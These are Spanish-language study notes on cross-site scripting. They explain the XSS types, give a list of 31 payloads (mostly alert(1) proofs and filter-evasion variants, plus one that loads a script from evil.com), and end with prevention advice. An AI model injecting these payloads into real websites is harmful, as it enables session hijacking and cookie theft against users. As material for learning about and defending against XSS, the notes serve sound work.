# Apuntes sobre XSS (Cross-Site Scripting)

## ¿Qué es XSS?

Cross-Site Scripting (XSS) es una vulnerabilidad de seguridad que permite a los atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios. Los scripts inyectados pueden robar cookies, secuestrar sesiones, redirigir a los usuarios a sitios maliciosos, entre otros.

## Tipos de XSS

1. **XSS Reflejado**: El script malicioso es reflejado de inmediato por el servidor. Generalmente se explota a través de enlaces manipulados.
  
2. **XSS Almacenado**: El script malicioso se almacena en el servidor y se sirve a otros usuarios. Este tipo es más peligroso, ya que puede afectar a múltiples usuarios.
  
3. **XSS DOM-based**: El ataque se produce cuando el navegador procesa la entrada del usuario sin una adecuada validación.

## Payloads Comunes

Aquí hay una lista de algunos payloads utilizados comúnmente para realizar ataques XSS:

1. `<script>alert(1)</script>`
2. `"><script>alert(1)</script>`
3. `<svg onload=alert(1)>`
4. `<iframe src="javascript:alert(1)"></iframe>`
5. `<IMG SRC="javascript:alert(1)">`
6. `"><img src=x onerror=alert(1)>`
7. `<svg><script>alert(1)</script>`
8. `<svg/onload=alert(1)>`
9. `<math><maction xlink:href="javascript:alert(1)">X`
10. `<body onload=alert(1)>`
11. `"><svg/onload=alert(1)>`
12. `<details open ontoggle=alert(1)>`
13. `<marquee onstart=alert(1)>`
14. `<video src="javascript:alert(1)"></video>`
15. `<object data="javascript:alert(1)"></object>`
16. `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
17. `"><input autofocus onfocus=alert(1)>`
18. `<embed src="data:text/html,<script>alert(1)</script>">`
19. `<form><button formaction=javascript:alert(1)>CLICK</button></form>`
20. `<isindex action="javascript:alert(1)">`
21. `<textarea autofocus onfocus=alert(1)>`
22. `<script src="https://evil.com/xss.js"></script>`
23. `<iframe src="data:text/html,<script>alert(1)"></script>">`
24. `<math href="javascript:alert(1)">X`
25. `"><input type="text" value="x" onfocus=alert(1)>`
26. `<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>`
27. `<style>*{xss:expression(alert(1))}</style>`
28. `<base href="javascript:alert(1)//">`
29. `"><link rel="stylesheet" href="javascript:alert(1)">`
30. `"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
31. `<svg/onload=alert(String.fromCharCode(88,83,83))>`

## Prevención de XSS

1. **Validación de Entrada**: Validar y sanitizar todos los datos de entrada del usuario.
  
2. **Content Security Policy (CSP)**: Implementar CSP para mitigar los efectos de los scripts maliciosos.
  
3. **Escapado de Salida**: Escapar correctamente los datos antes de renderizarlos en HTML.

## Conclusión

XSS es una vulnerabilidad grave que puede ser explotada de diversas maneras. La prevención requiere una combinación de buenas prácticas en el manejo de datos de entrada y salida.

**¡Mantente seguro!**
